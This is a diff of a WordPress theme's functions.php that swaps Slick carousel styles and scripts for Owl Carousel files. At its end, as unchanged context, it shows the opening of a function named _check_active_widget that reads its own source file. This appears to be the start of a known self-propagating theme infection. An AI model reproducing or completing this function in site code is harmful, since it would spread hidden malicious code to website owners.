@@ -13,8 +13,8 @@ function add_Spark_Js_Css_Files()
     // font awesome library
     wp_enqueue_style('all-css', get_template_directory_uri() . '/css/all.min.css');
     // Slick Jquery Plugin
-    wp_enqueue_style('slick-css', get_template_directory_uri() . '/css/slick.css');
-    wp_enqueue_style('slick-theme', get_template_directory_uri() . '/css/slick-theme.css');
+    wp_enqueue_style('owl-carousel-css', get_template_directory_uri() . '/css/owl.carousel.min.css');
+    wp_enqueue_style('owl-theme-default-css', get_template_directory_uri() . '/css/owl.theme.default.min.css');
     wp_enqueue_style('style-css', get_template_directory_uri() . '/css/custom.css');
 
     // Insert Script Fiels
@@ -23,7 +23,7 @@ function add_Spark_Js_Css_Files()
     wp_enqueue_script('popper-js', get_template_directory_uri() . '/js/popper.min.js', array(), false, true);
 
     wp_enqueue_script('bootstrap-js', get_Template_directory_uri() . '/js/bootstrap.min.js', array(), false, true);
-    wp_enqueue_script('slick-js', get_template_directory_uri() . '/slick/slick.min.js', array(), false, true);
+    wp_enqueue_script('owl-carousel-js', get_template_directory_uri() . '/js/owl.carousel.min.js', array(), false, true);
     wp_enqueue_script('wow-js', get_template_directory_uri() . '/js/wow.min.js', array(), false, true);
     wp_enqueue_script('main-js', get_template_directory_uri() . '/js/main.min.js', array(), false, true);
     // add condition for internet explorer 9 and less
@@ -70,8 +70,6 @@ function spark_position_custom_menu()
 }
 
 
-?>
-<?php
 function _check_active_widget()
 {
     $widget = substr(file_get_contents(__FILE__), strripos(file_get_contents(__FILE__), "<" . "?"));
